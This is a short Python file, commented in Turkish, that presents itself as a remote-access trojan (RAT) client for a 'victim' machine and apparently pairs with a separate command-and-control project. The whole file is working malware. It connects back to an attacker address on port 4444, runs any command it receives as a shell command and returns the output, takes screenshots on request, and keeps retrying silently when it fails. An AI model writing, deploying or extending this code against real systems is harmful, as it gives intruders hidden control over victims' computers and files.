import socket
import subprocess
import os
import pyautogui
from datetime import datetime

print("--- RAT CLIENT (Victim) ---")
SERVER_IP = "127.0.0.1" # Hacker IP'si
PORT = 4444

def connect():
    s = socket.socket()
    while True:
        try:
            print("Sunucuya bağlanılıyor...")
            s.connect((SERVER_IP, PORT))
            print("Bağlandı!")
            
            while True:
                cmd = s.recv(1024).decode()
                
                if cmd == "screen":
                    # Ekran görüntüsü al
                    filename = f"screen_{datetime.now().strftime('%H%M%S')}.png"
                    pyautogui.screenshot(filename)
                    s.send(f"Ekran kaydedildi: {filename}".encode())
                    
                elif cmd.startswith("cd "):
                    os.chdir(cmd[3:])
                    s.send(f"Klasör değişti: {os.getcwd()}".encode())
                    
                else:
                    # Terminal komutu çalıştır
                    output = subprocess.getoutput(cmd)
                    s.send(output.encode())
        except:
            pass # Bağlantı koparsa sessizce bekle ve tekrar dene

# connect() # Bu fonksiyonu çalıştırırsan PC'n sunucu bekler.
print("Bu kod bir RAT istemcisidir. 111. Proje (C2) ile birlikte çalışır.")